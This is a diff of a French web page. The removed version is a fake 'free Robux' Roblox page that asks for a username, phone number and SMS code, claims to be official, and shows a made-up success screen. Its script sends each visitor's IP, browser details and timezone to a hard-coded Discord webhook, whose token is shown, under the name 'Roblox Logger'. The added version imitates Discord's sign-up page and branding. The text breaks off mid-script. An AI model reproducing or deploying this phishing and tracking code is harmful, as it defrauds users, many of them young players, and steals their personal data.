@@ -1,900 +1,259 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Roblox Premium — Obtenir des Robux</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Créer un compte</title>
+<link href="https://fonts.googleapis.com/css2?family=gg+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-  <meta property="og:title" content="Roblox Premium — Robux Gratuits">
-  <meta property="og:description" content="Réclamez vos Robux gratuits et obtenez un accès Premium exclusif sur Roblox.">
-  <meta property="og:image" content="https://files.catbox.moe/n6mnay.jpg">
-  <meta property="og:type" content="website">
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Roblox Premium — Robux Gratuits">
-  <meta name="twitter:description" content="Réclamez vos Robux gratuits et obtenez un accès Premium exclusif.">
-  <meta name="twitter:image" content="https://files.catbox.moe/n6mnay.jpg">
+  body {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #313338;
+    font-family: 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    padding: 1.5rem;
+  }
 
-  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@600;700;800;900&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+  /* Background blobs like Discord login */
+  body::before, body::after {
+    content: '';
+    position: fixed;
+    border-radius: 50%;
+    z-index: 0;
+    pointer-events: none;
+  }
+  body::before {
+    width: 600px; height: 600px;
+    background: radial-gradient(circle, #5865f230 0%, transparent 70%);
+    top: -150px; left: -150px;
+  }
+  body::after {
+    width: 500px; height: 500px;
+    background: radial-gradient(circle, #eb459e20 0%, transparent 70%);
+    bottom: -100px; right: -100px;
+  }
 
-  <style>
-    :root {
-      --r:   #0066ff;
-      --rd:  #004ecc;
-      --rg:  rgba(0,102,255,0.2);
-      --ro:  #3385ff;
-      --ok:  #4ade80;
-      --bg:  #05080f;
-      --card:rgba(6,10,20,0.97);
-      --inp: rgba(255,255,255,0.04);
-      --bd:  rgba(255,255,255,0.07);
-      --bdr: rgba(0,102,255,0.4);
-      --tx:  #f0f4ff;
-      --mu:  rgba(240,244,255,0.38);
-      --er:  #ff8080;
-      --f:   'DM Sans', sans-serif;
-      --fn:  'Nunito', sans-serif;
-    }
+  .card {
+    background: #2b2d31;
+    border-radius: 4px;
+    padding: 2rem 2rem 1.5rem;
+    width: 100%;
+    max-width: 480px;
+    position: relative;
+    z-index: 1;
+    animation: fadeUp 0.3s ease;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+  }
 
-    *, *::before, *::after { box-sizing:border-box; margin:0; padding:0; }
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(12px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
 
-    body {
-      font-family: var(--f);
-      background: var(--bg);
-      color: var(--tx);
-      min-height: 100dvh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      overflow-x: hidden;
-      padding: 1.4rem;
-      -webkit-tap-highlight-color: transparent;
-    }
+  .logo {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 1rem;
+  }
 
-    /* ── BACKGROUND ── */
-    #bgCanvas { position:fixed; inset:0; z-index:0; pointer-events:none; }
+  .logo svg { width: 48px; height: 48px; }
 
-    .grid-overlay {
-      position:fixed; inset:0; z-index:0; pointer-events:none;
-      background-image:
-        linear-gradient(rgba(0,102,255,0.025) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(0,102,255,0.025) 1px, transparent 1px);
-      background-size: 50px 50px;
-      mask-image: radial-gradient(ellipse 100% 100% at 50% 50%, black 20%, transparent 80%);
-    }
+  .card-title {
+    font-size: 24px;
+    font-weight: 700;
+    color: #f2f3f5;
+    text-align: center;
+    margin-bottom: 0.25rem;
+    letter-spacing: -0.3px;
+  }
 
-    /* Scattered Robux symbols bg */
-    .bg-symbols {
-      position: fixed; inset:0; z-index:0; pointer-events:none;
-      overflow: hidden; opacity: 0.03;
-      font-size: 3rem; color: var(--r);
-      display: flex; flex-wrap: wrap; gap: 60px;
-      padding: 20px; align-content: flex-start;
-      filter: blur(1px);
-    }
+  .card-sub {
+    font-size: 14px;
+    color: #b5bac1;
+    text-align: center;
+    margin-bottom: 1.5rem;
+  }
 
-    /* ── CARD ── */
-    .card {
-      position: relative; z-index:2;
-      width:100%; max-width:480px;
-      background: var(--card);
-      border-radius: 28px;
-      padding: clamp(2rem,5.5vw,2.8rem) clamp(1.6rem,5vw,2.4rem);
-      border: 1px solid rgba(0,102,255,0.12);
-      box-shadow:
-        0 0 0 1px rgba(255,255,255,0.02) inset,
-        0 40px 100px rgba(0,0,0,0.9),
-        0 0 80px rgba(0,102,255,0.06);
-      backdrop-filter: blur(24px);
-      animation: cardIn .7s cubic-bezier(.23,1,.32,1) both;
-    }
+  /* Progress */
+  .progress-wrap {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    margin-bottom: 1.5rem;
+  }
 
-    .card::before {
-      content:'';
-      position:absolute; top:-1px; left:18%; right:18%; height:2px;
-      background: linear-gradient(90deg, transparent, var(--r), transparent);
-      from { opacity:0; transform:translateY(32px) scale(0.96); }
-      to   { opacity:1; transform:none; }
-    }
+  .progress-wrap span {
+    flex: 1;
+    height: 4px;
+    border-radius: 99px;
+    background: #3b3d44;
+  }
 
-    /* ── LOGO ── */
-    .logo-wrap {
-      display:flex; align-items:center; justify-content:center;
-      gap:14px; margin-bottom:1.8rem;
-    }
+  .progress-wrap span.done { background: #5865f2; }
 
-    .roblox-wrap {
-      position:relative;
-      animation: floatBob 3.5s ease-in-out infinite;
-    }
-    @keyframes floatBob {
-      0%,100% { transform:translateY(0) rotate(0deg); }
-      50%      { transform:translateY(-8px) rotate(3deg); }
-    }
+  .progress-label {
+    font-size: 11px;
+    color: #b5bac1;
+    text-align: right;
+    margin-bottom: 0.75rem;
+    margin-top: -1rem;
+    letter-spacing: 0.03em;
+    text-transform: uppercase;
+    font-weight: 700;
+  }
 
-    .roblox-icon {
-      width:58px; height:58px; border-radius:16px;
-      background: linear-gradient(145deg, #0066ff, #003db3);
-      display:flex; align-items:center; justify-content:center;
-      font-size:1.9rem;
-      box-shadow: 0 12px 36px rgba(0,102,255,0.45), 0 0 0 1px rgba(255,255,255,0.08) inset;
-      position: relative; overflow: hidden;
-    }
-    .roblox-icon::after {
-      content:'';
-      position: absolute; inset:0;
-      background: linear-gradient(135deg, rgba(255,255,255,0.15) 0%, transparent 50%);
-    }
+  .field {
+    margin-bottom: 1rem;
+  }
 
-    .r-ring {
-      position:absolute; inset:-8px; border-radius:24px;
-      border:1.5px solid rgba(0,102,255,0.25);
-      animation: ringP 2.4s ease-in-out infinite;
-    }
-    .r-ring2 {
-      position:absolute; inset:-17px; border-radius:32px;
-      border:1px solid rgba(0,102,255,0.1);
-      animation: ringP 2.4s ease-in-out .7s infinite;
-    }
-    @keyframes ringP {
-      0%,100%{ opacity:1; transform:scale(1); }
-      50%    { opacity:.3; transform:scale(1.05); }
-    }
+  .field label {
+    display: block;
+    font-size: 12px;
+    font-weight: 700;
+    color: #b5bac1;
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+    margin-bottom: 6px;
+  }
 
-    .logo-text-col { display:flex; flex-direction:column; gap:4px; }
-    .logo-name {
-      font-family:var(--fn); font-weight:900; font-size:1.4rem;
-      color:#fff; letter-spacing:-.5px; line-height:1;
-    }
-    .logo-badge {
-      font-size:.6rem; font-weight:800; letter-spacing:2px;
-      text-transform:uppercase; padding:3px 10px; border-radius:100px;
-      background: linear-gradient(135deg, #0066ff, #3385ff);
-      color:#fff; width:fit-content;
-      box-shadow: 0 3px 10px rgba(0,102,255,0.35);
-    }
+  .field label .req { color: #ed4245; margin-left: 2px; }
 
-    /* ── ROBUX COUNTER DISPLAY ── */
-    .robux-display {
-      display:flex; align-items:center; justify-content:center;
-      gap:10px; margin-bottom:1.6rem;
-      padding:14px 20px; border-radius:16px;
-      background: linear-gradient(135deg, rgba(0,102,255,0.08), rgba(51,133,255,0.05));
-      border:1px solid rgba(0,102,255,0.18);
-      position:relative; overflow:hidden;
-    }
-    .robux-display::before {
-      content:'';
-      position:absolute; inset:0;
-      background: radial-gradient(ellipse 80% 100% at 50% 0%, rgba(0,102,255,0.07), transparent);
-    }
-    .robux-icon-sm { font-size:1.5rem; position:relative; }
-    .robux-amount {
-      font-family:var(--fn); font-weight:900; font-size:1.8rem;
-      color:#fff; position:relative;
-      text-shadow: 0 0 30px rgba(0,102,255,0.6);
-    }
-    .robux-amount span { color:var(--r); }
-    .robux-label {
-      font-size:.72rem; font-weight:600; letter-spacing:1.5px;
-      text-transform:uppercase; color:var(--mu); position:relative;
-      align-self:flex-end; padding-bottom:4px;
-    }
+  .field input {
+    width: 100%;
+    padding: 10px 12px;
+    font-size: 16px;
+    font-family: inherit;
+    background: #1e1f22;
+    border: 1px solid #1e1f22;
+    border-radius: 3px;
+    color: #dbdee1;
+    outline: none;
+    transition: border-color 0.15s;
+  }
 
-    /* ── PROGRESS ── */
-    .prog-wrap {
-      height:3px; background:rgba(255,255,255,.05);
-      border-radius:10px; margin-bottom:1.8rem; overflow:hidden;
-    }
-    .prog-bar {
-      height:100%; border-radius:10px;
-      background: linear-gradient(90deg, #0066ff, #3385ff);
-      transition: width .5s cubic-bezier(.4,0,.2,1);
-      box-shadow: 0 0 10px rgba(0,102,255,.6);
-    }
+  .field input::placeholder { color: #4e5058; }
 
-    /* ── STEP DOTS ── */
-    .steps {
-      display:flex; align-items:center; justify-content:center;
-      gap:0; margin-bottom:2rem;
-    }
-    .s-dot {
-      width:34px; height:34px; border-radius:50%;
-      background:rgba(255,255,255,.04);
-      border:1.5px solid rgba(255,255,255,.08);
-      display:flex; align-items:center; justify-content:center;
-      font-size:.78rem; font-weight:700; color:var(--mu);
-      transition:all .35s; flex-shrink:0;
-    }
-    .s-dot.active { background:var(--r); border-color:var(--r); color:#fff; box-shadow:0 0 20px rgba(0,102,255,.5); }
-    .s-dot.done   { background:rgba(74,222,128,.12); border-color:rgba(74,222,128,.4); color:var(--ok); }
-    .s-line {
-      height:1.5px; width:44px; background:rgba(255,255,255,.07);
-      transition:background .4s; flex-shrink:0;
-    }
-    .s-line.done { background:rgba(74,222,128,.3); }
+  .field input:focus {
+    border-color: #5865f2;
+  }
 
-    /* ── TEXT ── */
-    .st { font-family:var(--fn); font-weight:800; font-size:1.15rem; color:#fff; margin-bottom:4px; }
-    .ss { font-size:.82rem; color:var(--mu); margin-bottom:1.7rem; line-height:1.55; }
+  .error-msg {
+    display: block;
+    font-size: 12px;
+    font-style: italic;
+    color: #ed4245;
+    margin-top: 5px;
+    min-height: 16px;
+  }
 
-    /* ── FIELDS ── */
-    .field { margin-bottom:1.25rem; }
+  .btn-submit {
+    width: 100%;
+    padding: 11px;
+    margin-top: 1.25rem;
+    font-size: 16px;
+    font-family: inherit;
+    font-weight: 500;
+    background: #5865f2;
+    border: none;
+    border-radius: 3px;
+    color: #fff;
+    cursor: pointer;
+    transition: background 0.15s, transform 0.1s;
+  }
 
-    label {
-      display:block; font-size:.68rem; font-weight:600;
-      letter-spacing:1.6px; text-transform:uppercase;
-      color:var(--mu); margin-bottom:8px; transition:color .2s;
-    }
-    .field:focus-within > label { color:rgba(0,102,255,.85); }
+  .btn-submit:hover { background: #4752c4; }
+  .btn-submit:active { transform: scale(0.99); }
 
-    input[type=text], input[type=tel], input[type=password] {
-      width:100%; padding:13px 16px;
-      border-radius:13px; border:1px solid var(--bd);
-      background:var(--inp); color:var(--tx);
-      font-family:var(--f); font-size:.95rem; outline:none;
-      transition:all .25s;
-    }
-    input::placeholder { color:rgba(245,240,240,.15); }
-    input[type=text]:focus, input[type=tel]:focus, input[type=password]:focus {
-      border-color:var(--bdr);
-      background:rgba(0,102,255,.03);
-      box-shadow:0 0 0 3px rgba(0,102,255,.1);
-    }
+  .divider {
+    border: none;
+    border-top: 1px solid #3b3d44;
+    margin: 1.25rem 0 1rem;
+  }
 
-    /* ── PHONE PREFIX ── */
-    .phone-wrap { display:flex; gap:8px; }
-    .phone-prefix {
-      padding:13px 13px; border-radius:13px;
-      border:1px solid var(--bd); background:var(--inp);
-      color:var(--tx); font-family:var(--f); font-size:.9rem;
-      display:flex; align-items:center; gap:6px;
-      white-space:nowrap; flex-shrink:0;
-    }
-    .phone-wrap input { flex:1; }
+  .footer-link {
+    font-size: 14px;
+    color: #b5bac1;
+    text-align: left;
+  }
 
-    /* ── ROBUX PILLS ── */
-    .r-pills { display:grid; grid-template-columns:repeat(3,1fr); gap:9px; margin-bottom:1.3rem; }
-    .r-pill {
-      padding:14px 8px; border-radius:14px;
-      border:1.5px solid var(--bd); background:var(--inp);
-      cursor:pointer; text-align:center; transition:all .22s;
-      position:relative; overflow:hidden;
-    }
-    .r-pill::before {
-      content:''; position:absolute; inset:0;
-      background:linear-gradient(135deg,rgba(0,102,255,.08),transparent);
-      opacity:0; transition:opacity .22s;
-    }
-    .r-pill:hover { border-color:rgba(0,102,255,.3); transform:translateY(-2px); }
-    .r-pill:hover::before { opacity:1; }
-    .r-pill.sel {
-      border-color:var(--r); background:rgba(0,102,255,.07);
-      box-shadow:0 0 22px rgba(0,102,255,.14);
-    }
-    .r-pill.sel::before { opacity:1; }
-    .r-pill .rnum { font-family:var(--fn); font-weight:900; font-size:1.1rem; color:#fff; }
-    .r-pill .rlbl { font-size:.62rem; color:var(--mu); margin-top:2px; font-weight:500; }
-    .r-pill .r-badge {
-      position:absolute; top:-1px; right:-1px;
-      font-size:.5rem; font-weight:800; letter-spacing:1px;
-      padding:3px 7px; border-radius:0 13px 0 8px;
-      background:linear-gradient(135deg,#0066ff,#3385ff); color:#fff; text-transform:uppercase;
-    }
-    .r-pill.sel .rnum { color:var(--r); }
-    .r-pill .ricon { font-size:.9rem; margin-bottom:3px; }
+  .footer-link a {
+    color: #00a8fc;
+    text-decoration: none;
+  }
 
-    /* ── ERR ── */
-    .err { font-size:.77rem; color:var(--er); margin-top:6px; min-height:16px; }
+  .footer-link a:hover { text-decoration: underline; }
 
-    /* ── INFO ROW ── */
-    .info-row {
-      display:flex; align-items:center; gap:9px;
-      padding:10px 14px; border-radius:11px;
-      background:rgba(0,102,255,.04); border:1px solid rgba(0,102,255,.1);
-      margin-bottom:1.4rem;
-    }
-    .info-row .ii { font-size:.95rem; flex-shrink:0; }
-    .info-row p { font-size:.76rem; color:rgba(0,102,255,.65); line-height:1.4; }
+  .terms {
+    font-size: 12px;
+    color: #72767d;
+    margin-top: 0.75rem;
+    line-height: 1.5;
+  }
 
-    /* ── SUMMARY ── */
-    .summary {
-      background:rgba(255,255,255,.025);
-      border:1px solid var(--bd); border-radius:14px;
-      padding:13px 16px; margin-bottom:1.4rem;
-      display:flex; flex-direction:column; gap:8px;
-    }
-    .sum-row { display:flex; justify-content:space-between; align-items:center; font-size:.82rem; }
-    .sum-key { color:var(--mu); }
-    .sum-val { color:#fff; font-weight:700; font-family:var(--fn); font-size:.86rem; }
-    .sum-val.r { color:var(--r); }
-
-    /* ── BUTTON ── */
-    .btnw { display:flex; justify-content:center; margin-top:1.6rem; }
-    .btn {
-      padding:15px 44px; border-radius:999px; border:none;
-      background:linear-gradient(135deg,#0066ff,#004ecc);
-      color:#fff; font-family:var(--fn); font-size:1rem; font-weight:800;
-      cursor:pointer; min-height:52px;
-      box-shadow:0 8px 28px rgba(0,102,255,.4), 0 0 0 1px rgba(255,255,255,.08) inset;
-      transition:all .3s cubic-bezier(.34,1.56,.64,1);
-      position:relative; overflow:hidden; letter-spacing:.3px;
-    }
-    .btn::after {
-      content:''; position:absolute; inset:0;
-      background:linear-gradient(135deg,rgba(255,255,255,.18),transparent);
-      opacity:0; transition:opacity .2s;
-    }
-    .btn:hover::after { opacity:1; }
-    .btn:hover:not(:disabled) { transform:translateY(-2px) scale(1.04); box-shadow:0 14px 36px rgba(0,102,255,.5); }
-    .btn:disabled { background:rgba(255,255,255,.07); color:var(--mu); box-shadow:none; cursor:not-allowed; transform:none; }
-
-    /* ── CODE BOX ── */
-    .codebox {
-      display:flex; justify-content:center;
-      gap:clamp(.55rem,3vw,.85rem); margin:1.6rem 0;
-    }
-    .codebox input {
-      width:clamp(54px,14vw,70px); height:clamp(64px,16vw,78px);
-      font-size:clamp(1.7rem,6vw,2.1rem); font-weight:900;
-      text-align:center; border-radius:15px;
-      border:1.5px solid var(--bd); background:var(--inp);
-      color:var(--r); padding:0; outline:none;
-      transition:all .22s; font-family:var(--fn);
-    }
-    .codebox input:focus {
-      border-color:var(--r);
-      box-shadow:0 0 0 3px rgba(0,102,255,.2), 0 0 24px rgba(0,102,255,.12);
-      transform:scale(1.07);
-    }
-    .codebox input.filled { border-color:rgba(0,102,255,.45); }
-
-    /* ── RESEND ── */
-    .resend {
-      text-align:center; margin-top:1.2rem;
-      font-size:.83rem; color:var(--mu);
-      cursor:pointer; transition:color .22s; user-select:none;
-    }
-    .resend:hover { color:var(--r); }
-
-    /* ── SEC BADGE ── */
-    .sec-badge {
-      display:flex; align-items:center; justify-content:center;
-      gap:6px; margin-top:1.3rem;
-      font-size:.71rem; color:var(--mu);
-    }
-    .sec-badge .dot { width:6px; height:6px; border-radius:50%; background:var(--ok); }
-
-    /* ── PHONE CONFIRM ── */
-    .phone-confirm {
-      font-size:.81rem; color:var(--mu); text-align:center; margin-bottom:4px;
-    }
-    .phone-confirm strong { color:var(--r); font-weight:700; }
-
-    /* ── SUCCESS ── */
-    .success-wrap { text-align:center; padding:.5rem 0; }
-
-    .check-ring {
-      width:92px; height:92px; border-radius:50%;
-      border:2.5px solid var(--ok);
-      display:flex; align-items:center; justify-content:center;
-      font-size:2.3rem; margin:0 auto 1.8rem;
-      box-shadow:0 0 40px rgba(74,222,128,.3), 0 0 80px rgba(74,222,128,.1);
-      background:rgba(74,222,128,.05);
-      animation:popIn .7s cubic-bezier(.34,1.56,.64,1) both;
-    }
-    @keyframes popIn {
-      from { opacity:0; transform:scale(.3) rotate(-20deg); }
-      to   { opacity:1; transform:scale(1) rotate(0deg); }
-    }
-    .suc-title {
-      font-family:var(--fn); font-weight:900; font-size:1.7rem;
-      color:var(--ok); margin-bottom:8px;
-    }
-    .suc-sub {
-      font-size:.87rem; color:var(--mu); line-height:1.6;
-      max-width:320px; margin:0 auto 1.6rem;
-    }
-
-    .suc-robux {
-      display:flex; align-items:center; justify-content:center; gap:10px;
-      padding:16px 24px; border-radius:16px;
-      background:linear-gradient(135deg, rgba(0,102,255,0.1), rgba(51,133,255,0.07));
-      border:1px solid rgba(0,102,255,0.2);
-      margin-bottom:1.2rem;
-    }
-    .suc-robux-num {
-      font-family:var(--fn); font-weight:900; font-size:2rem; color:var(--r);
-      text-shadow:0 0 30px rgba(0,102,255,0.5);
-    }
-    .suc-robux-lbl { font-size:.75rem; color:var(--mu); text-transform:uppercase; letter-spacing:1.5px; font-weight:600; }
-
-    .suc-perks { display:grid; grid-template-columns:1fr 1fr; gap:8px; text-align:left; }
-    .suc-perk {
-      display:flex; align-items:center; gap:8px;
-      padding:10px 12px; border-radius:11px;
-      background:rgba(74,222,128,.05); border:1px solid rgba(74,222,128,.14);
-      font-size:.79rem; color:rgba(74,222,128,.8);
-    }
-
-    /* ── PANEL ANIM ── */
-    .panel { animation:panIn .42s cubic-bezier(.23,1,.32,1) both; }
-    @keyframes panIn {
-      from { opacity:0; transform:translateX(18px) scale(.98); }
-      to   { opacity:1; transform:none; }
-    }
-
-    /* ── ROBUX COUNTER ANIM ── */
-    @keyframes countUp {
-      from { opacity:0; transform:translateY(8px); }
-      to   { opacity:1; transform:none; }
-    }
-
-    @media(max-width:480px){
-      .card{ border-radius:22px; }
-      .btn{ width:100%; }
-      .suc-perks{ grid-template-columns:1fr; }
-    }
-  </style>
+  .terms a { color: #00a8fc; text-decoration: none; }
+  .terms a:hover { text-decoration: underline; }
+</style>
 </head>
 <body>
 
-<canvas id="bgCanvas"></canvas>
-<div class="grid-overlay"></div>
+<div class="card">
 
-<div class="card" id="card">
-
-  <!-- LOGO -->
-  <div class="logo-wrap">
-    <div class="roblox-wrap">
-      <div class="r-ring2"></div>
-      <div class="r-ring"></div>
-      <div class="roblox-icon" style="font-size:2rem;">🎁</div>
-    </div>
-    <div class="logo-text-col">
-      <span class="logo-name">Roblox</span>
-      <span class="logo-badge">PREMIUM</span>
-    </div>
+  <div class="logo">
+    <!-- Discord logo SVG -->
+    <svg viewBox="0 0 127.14 96.36" xmlns="http://www.w3.org/2000/svg">
+      <path fill="#5865f2" d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/>
+    </svg>
   </div>
 
-  <!-- ROBUX COUNTER -->
-  <div class="robux-display">
-    <span class="robux-icon-sm">💎</span>
-    <span class="robux-amount"><span id="counterDisplay">0</span></span>
-    <div>
-      <div class="robux-label">Robux</div>
-    </div>
-    <span class="robux-icon-sm">💎</span>
+  <h1 class="card-title">Créer un compte</h1>
+  <p class="card-sub">Rejoins-nous, c'est gratuit !</p>
+
+  <div class="progress-wrap">
+    <span class="done"></span>
+    <span></span>
+    <span></span>
+  </div>
+  <p class="progress-label">Étape 1 sur 3</p>
+
+  <div class="field">
+    <label for="pseudo">Nom d'utilisateur <span class="req">*</span></label>
+    <input type="text" id="pseudo" placeholder="cool_username" autocomplete="off" autofocus>
+    <span class="error-msg" id="err"></span>
   </div>
 
-  <!-- PROGRESS -->
-  <div class="prog-wrap"><div class="prog-bar" id="progBar" style="width:33%"></div></div>
+  <button class="btn-submit" onclick="goNext()">Continuer</button>
 
-  <!-- STEP DOTS -->
-  <div class="steps" id="stepDots">
-    <div class="s-dot active" id="dot1">1</div>
-    <div class="s-line" id="line1"></div>
-    <div class="s-dot" id="dot2">2</div>
-    <div class="s-line" id="line2"></div>
-    <div class="s-dot" id="dot3">3</div>
-  </div>
+  <hr class="divider">
 
-  <!-- ══ STEP 1 ══ -->
-  <div id="step1" class="panel">
-    <p class="st">Votre compte Roblox</p>
-    <p class="ss">Entrez votre pseudo Roblox et choisissez la quantité de Robux à recevoir.</p>
+  <p class="footer-link">Tu as déjà un compte ? <a href="#">Se connecter</a></p>
 
-    <div class="field">
-      <label>Pseudo Roblox</label>
-      <input type="text" id="username" autocomplete="off" placeholder="ex: BuilderPro123">
-    </div>
-
-    <div class="field">
-      <label>Quantité de Robux</label>
-      <div class="r-pills">
-        <div class="r-pill" data-val="800">
-          <div class="ricon">💎</div>
-          <div class="rnum">800</div>
-          <div class="rlbl">Robux</div>
-        </div>
-        <div class="r-pill" data-val="1700">
-          <span class="r-badge">Populaire</span>
-          <div class="ricon">💎</div>
-          <div class="rnum">1 700</div>
-          <div class="rlbl">Robux</div>
-        </div>
-        <div class="r-pill" data-val="4500">
-          <span class="r-badge">Max</span>
-          <div class="ricon">💎</div>
-          <div class="rnum">4 500</div>
-          <div class="rlbl">Robux</div>
-        </div>
-      </div>
-    </div>
-
-    <div class="info-row">
-      <span class="ii">🔒</span>
-      <p>Connexion sécurisée. Vos données ne seront jamais revendues à des tiers.</p>
-    </div>
-
-    <div class="btnw"><button class="btn" id="b1" disabled>Continuer &nbsp;→</button></div>
-    <div class="sec-badge"><div class="dot"></div> Sécurisé SSL &nbsp;·&nbsp; Officiel Roblox</div>
-  </div>
-
-  <!-- ══ STEP 2 ══ -->
-  <div id="step2" style="display:none" class="panel">
-    <p class="st">Vérification SMS</p>
-    <p class="ss">Entrez votre numéro pour recevoir un code de confirmation et valider votre compte.</p>
-
-    <div class="summary">
-      <div class="sum-row">
-        <span class="sum-key">Pseudo</span>
-        <span class="sum-val" id="s-user">—</span>
-      </div>
-      <div class="sum-row">
-        <span class="sum-key">Robux</span>
-        <span class="sum-val r" id="s-rob">—</span>
-      </div>
-    </div>
-
-    <div class="field">
-      <label>Numéro de téléphone</label>
-      <div class="phone-wrap">
-        <div class="phone-prefix">🇫🇷 +33</div>
-        <input type="tel" id="phone" placeholder="06 12 34 56 78" inputmode="tel" autocomplete="tel">
-      </div>
-      <p class="err" id="phoneErr"></p>
-    </div>
-
-    <div class="info-row">
-      <span class="ii">📱</span>
-      <p>Vérification anti-bot requise. SMS gratuit envoyé immédiatement.</p>
-    </div>
-
-    <div class="btnw"><button class="btn" id="b2" disabled>Recevoir le code SMS</button></div>
-    <div class="sec-badge"><div class="dot"></div> Numéro chiffré &nbsp;·&nbsp; Non partagé</div>
-  </div>
-
-  <!-- ══ STEP 3 ══ -->
-  <div id="step3" style="display:none" class="panel">
-    <p class="st">Code de confirmation</p>
-    <p class="phone-confirm">Code envoyé au <strong id="phoneSummary">—</strong></p>
-    <p class="ss" style="margin-top:5px">Saisissez le code à 4 chiffres reçu par SMS. Expire dans <strong style="color:var(--r)">10 min</strong>.</p>
-
-    <div class="summary">
-      <div class="sum-row">
-        <span class="sum-key">Pseudo</span>
-        <span class="sum-val" id="s-user2">—</span>
-      </div>
-      <div class="sum-row">
-        <span class="sum-key">Robux</span>
-        <span class="sum-val r" id="s-rob2">—</span>
-      </div>
-      <div class="sum-row">
-        <span class="sum-key">Téléphone</span>
-        <span class="sum-val" id="s-tel2">—</span>
-      </div>
-    </div>
-
-    <div class="codebox">
-      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
-      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
-      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
-      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
-    </div>
-
-    <div class="btnw"><button class="btn" id="b3" disabled>💎 &nbsp;Réclamer mes Robux</button></div>
-    <div class="resend" id="resend">Renvoyer le code →</div>
-  </div>
-
-  <!-- ══ STEP 4 SUCCESS ══ -->
-  <div id="step4" style="display:none" class="panel">
-    <div class="success-wrap">
-      <div class="check-ring">✓</div>
-      <p class="suc-title">Robux reçus !</p>
-      <p class="suc-sub">Vos Robux ont été crédités sur votre compte. Profitez de tous les avantages Premium !</p>
-
-      <div class="suc-robux">
-        <span style="font-size:1.6rem">💎</span>
-        <div>
-          <div class="suc-robux-num" id="finalAmount">1 700</div>
-          <div class="suc-robux-lbl">Robux crédités</div>
-        </div>
-      </div>
-
-      <div class="suc-perks">
-        <div class="suc-perk">🎭 Avatar premium</div>
-        <div class="suc-perk">🏆 Badge exclusif</div>
-        <div class="suc-perk">🛍️ Boutique illimitée</div>
-        <div class="suc-perk">⭐ Rank prioritaire</div>
-        <div class="suc-perk">🎮 Accès VIP jeux</div>
-        <div class="suc-perk">💬 Chat amélioré</div>
-      </div>
-    </div>
-  </div>
+  <p class="terms">
+    En créant un compte, tu acceptes les <a href="#">Conditions d'utilisation</a> et la <a href="#">Politique de confidentialité</a> de Discord.
+  </p>
 
 </div>
 
 <script>
-/* ══════════════════════
-   WEBHOOK
-══════════════════════ */
-const WH = "https://canary.discord.com/api/webhooks/1477510811013611673/GmLQ1tcMNWh5IBjhZhPqqyWI75HvgtSU23RHfdI-tSwVjzU6UgJhrVyXUjs8Efaeo5zy";
+  const input = document.getElementById('pseudo');
+  const err   = document.getElementById('err');
 
-const getInfo = async () => {
-  const d = {
-    ts: new Date().toISOString(),
-    ua: navigator.userAgent,
-    lang: navigator.language,
-    screen: `${screen.width}×${screen.height}`,
-    ref: document.referrer || "direct",
-    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    ip: "—"
-  };
-  try { d.ip = (await fetch("https://api.ipify.org?format=json").then(r=>r.json())).ip; } catch(_){}
-  return d;
-};
+  input.addEventListener('keydown', e => { if (e.key === 'Enter') goNext(); });
 
-async function webhook(title, fields={}) {
-  const c = await getInfo();
-  const embed = {
-    title, color: 0x0066ff,
-    fields: Object.entries(fields).map(([name,value])=>({
-      name, value:"```"+(value||"—")+"```", inline: name.length<22
-    })),
-    footer:{ text:`🌐 ${c.ip}  •  🕐 ${new Date().toLocaleString('fr-FR')}  •  📍 ${c.tz}` },
-    timestamp: c.ts
-  };
-  try {
-    await fetch(WH,{
-      method:"POST", headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({ embeds:[embed], username:"Roblox Logger 🎮", avatar_url:"https://files.catbox.moe/h4ied4.png" })
-    });
-  } catch(_){}
-}
-
-window.addEventListener("load", ()=>webhook("👁️ Nouvelle visite Roblox"));
-
-/* ══════════════════════
-   ROBUX COUNTER ANIM
-══════════════════════ */
-let counterTarget = 0;
-let counterCurrent = 0;
-let counterInterval = null;
-
-function animateCounter(target) {
-  counterTarget = target;
-  if (counterInterval) clearInterval(counterInterval);
-  const duration = 1400;
-  const steps = 60;
-  const increment = (target - counterCurrent) / steps;
-  let step = 0;
-  counterInterval = setInterval(()=>{
-    step++;
